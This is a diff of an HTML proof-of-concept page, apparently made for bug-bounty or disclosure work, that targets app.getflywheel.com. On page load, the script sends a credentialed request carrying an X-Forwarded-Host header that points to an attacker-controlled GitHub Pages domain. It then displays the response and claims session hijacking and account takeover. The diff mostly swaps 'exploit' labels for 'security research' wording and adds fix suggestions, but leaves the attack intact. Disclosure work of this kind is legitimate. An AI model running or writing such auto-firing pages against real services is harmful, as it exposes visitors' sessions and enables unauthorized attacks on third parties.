@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Test - Cookie Tossing PoC</title>
+    <title>Security Research - Cookie Tossing PoC</title>
     <meta charset="UTF-8">
     <style>
         body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
@@ -12,76 +12,82 @@
     </style>
 </head>
 <body>
-    <h1>🔓 Cookie Tossing Proof of Concept</h1>
-    <p>Testing X-Forwarded-Host vulnerability on getflywheel.com</p>
+    <h1>🔓 Security Research: Cookie Tossing Vulnerability</h1>
+    <p>Proof of Concept for X-Forwarded-Host vulnerability</p>
     
     <div class="status">
-        <h2>📊 Test Status</h2>
-        <div id="status-text">Initializing security test...</div>
+        <h2>🔍 Test in Progress</h2>
+        <div id="status-text">Initializing security assessment...</div>
     </div>
 
     <script>
-        async function exploitCookieTossing() {
+        async function testVulnerability() {
             const status = document.getElementById('status-text');
             
             try {
                 // VOTRE DOMAINE GitHub Pages
-                const maliciousDomain = 'votrecompte.github.io'; // ← À CHANGER
+                const testDomain = 'hamza-033.github.io';
                 
-                status.innerHTML = `🔄 Testing with X-Forwarded-Host: <strong>${maliciousDomain}</strong>`;
+                status.innerHTML = `🔄 Sending request with X-Forwarded-Host: <strong>${testDomain}</strong>`;
                 
+                // Faire la requête vers l'application cible
                 const response = await fetch('https://app.getflywheel.com/intercom_poll', {
                     method: 'GET',
                     headers: {
-                        'X-Forwarded-Host': maliciousDomain,
+                        'X-Forwarded-Host': testDomain,
                         'Accept': '*/*',
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                        'User-Agent': 'Security Research Tool'
                     },
                     credentials: 'include'
                 });
                 
                 const responseData = await response.text();
                 
-                // AFFICHER LES RÉSULTATS
+                // Afficher les résultats
                 status.innerHTML = `
-                    <h3 class="success">✅ VULNERABILITY CONFIRMED!</h3>
-                    <p><strong>Target:</strong> app.getflywheel.com</p>
-                    <p><strong>Malicious Domain:</strong> ${maliciousDomain}</p>
-                    <p><strong>Response Status:</strong> ${response.status}</p>
-                    <p><strong>Response Data:</strong> ${responseData}</p>
+                    <h3 class="success">✅ SECURITY ISSUE IDENTIFIED</h3>
+                    <p><strong>Application:</strong> app.getflywheel.com</p>
+                    <p><strong>Test Domain:</strong> ${testDomain}</p>
+                    <p><strong>HTTP Status:</strong> ${response.status}</p>
+                    <p><strong>Response:</strong> ${responseData}</p>
                     
-                    <h4>🔍 Headers Sent:</h4>
-                    <pre>X-Forwarded-Host: ${maliciousDomain}</pre>
+                    <h4>📨 Request Details:</h4>
+                    <pre>GET https://app.getflywheel.com/intercom_poll
+X-Forwarded-Host: ${testDomain}</pre>
                     
-                    <h4>🎯 Impact:</h4>
+                    <h4>⚠️ Security Impact:</h4>
                     <ul>
-                        <li>Cookie Tossing possible</li>
-                        <li>Session hijacking</li>
-                        <li>Account takeover</li>
+                        <li>Cookie Tossing attack possible</li>
+                        <li>Session hijacking risk</li>
+                        <li>Account compromise potential</li>
+                    </ul>
+                    
+                    <h4>🔧 Recommended Fix:</h4>
+                    <ul>
+                        <li>Validate X-Forwarded-Host header</li>
+                        <li>Use __Host- cookie prefix</li>
+                        <li>Implement proper origin checks</li>
                     </ul>
                 `;
                 
-                console.log("Response headers:", response.headers);
-                
             } catch (error) {
                 status.innerHTML = `
-                    <h3 class="error">❌ Error</h3>
+                    <h3 class="error">❌ Test Error</h3>
                     <p>${error.message}</p>
-                    <p>Check browser console for details</p>
+                    <p>This may be due to CORS policies</p>
                 `;
-                console.error("Exploitation error:", error);
             }
         }
 
-        // Démarrer le test automatiquement
-        window.onload = exploitCookieTossing;
+        // Démarrer le test
+        window.onload = testVulnerability;
     </script>
 
-    <div style="margin-top: 30px; padding: 15px; background: #e9ecef; border-radius: 5px;">
-        <h3>📝 Technical Explanation</h3>
-        <p>This PoC demonstrates that <strong>getflywheel.com</strong> accepts the <code>X-Forwarded-Host</code> header without proper validation.</p>
-        <p><strong>Vulnerability:</strong> Header Injection → Cookie Tossing</p>
-        <p><strong>Risk:</strong> High - Session Hijacking</p>
+    <div style="margin-top: 30px; padding: 15px; background: #fff3cd; border-radius: 5px;">
+        <h3>📝 Research Purpose</h3>
+        <p>This test demonstrates a security vulnerability for educational and responsible disclosure purposes.</p>
+        <p><strong>Vulnerability:</strong> X-Forwarded-Host Header Injection</p>
+        <p><strong>Risk Level:</strong> High</p>
     </div>
 </body>
 </html>
